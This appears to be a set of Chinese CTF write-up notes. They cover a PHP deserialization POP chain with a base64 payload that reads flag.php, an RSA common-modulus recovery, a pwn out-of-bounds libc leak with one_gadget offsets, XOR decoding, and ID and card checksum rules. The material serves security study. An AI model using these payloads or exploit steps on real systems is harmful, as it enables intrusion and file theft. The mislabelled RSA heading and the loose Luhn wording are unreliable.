### 题目详情

**Web反序列化POP链**
- class User {name, role, __toString: return role->getInfo()}
- class Admin {command, __call(method): if method=='getInfo': return command->execute()}
- class FileReader {filename, execute: file_get_contents(filename)}
- payload: new User('dummy', new Admin(new FileReader('flag.php')))
- base64后:`Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImR1bW15IjtzOjEwOiIAVXNlcgByb2xlIjtPOjU6IkFkbWluIjoxOntzOjE0OiIAQWRtaW4AY29tbWFuZCI7TzoxMDoiRmlsZVJlYWRlciI6MTp7czoyMDoiAEZpbGVSZWFkZXIAZmlsZW5hbWUiO3M6ODoiZmxhZy5waHAiO319fQ==`

**RSA公因数攻击**
- n, e1=65537, e2=10001, c1, c2(同m)
- `g, s, t = gmpy2.gcdext(e1, e2)`
- if s<0: c1=gmpy2.invert(c1,n); if t<0: c2=gmpy2.invert(c2,n)
- `plain = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n`

**二进制密文转换**
- 读密文.txt(列表形式)
- 每项末字符==112(=0x70='p') → '0',其他 → '1'
- 拼位后int(p, 2)→long_to_bytes

**PWN-格式化字符串/数组越界**
- 菜单题:1.set 2.show 3.exit
- show(-15) 负idx越界读libc_addr = leak - 0x1ed6a0 = libc_base
- gadget = libc_base + 0xe3b01
- input "/flag\x00"做cmd(1) payload参数

**逆向XOR**
- `unk_450000[i] = (unk_450000[i] ^ (key&0xffff)) - ((key&0xffff0000)>>16)`
- key=0x0685EE20

**CSV-base64+异或解码**
- 16字节key='a1a60171273e74a6'
- `res += bytes.fromhex(hex(D[i]^ord(K[i+1&15]))[2:].zfill(2))`
- 注意循环索引`(i+1)&15`而非`i&15`

**数据脱敏(数据验证)**
- 身份证:18位+校验码(权重[7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]+表[1,0,X,9,8,7,6,5,4,3,2])
- 银行卡:Luhn算法(偶数位*2-9)+奇数位求和 mod 10 == 0
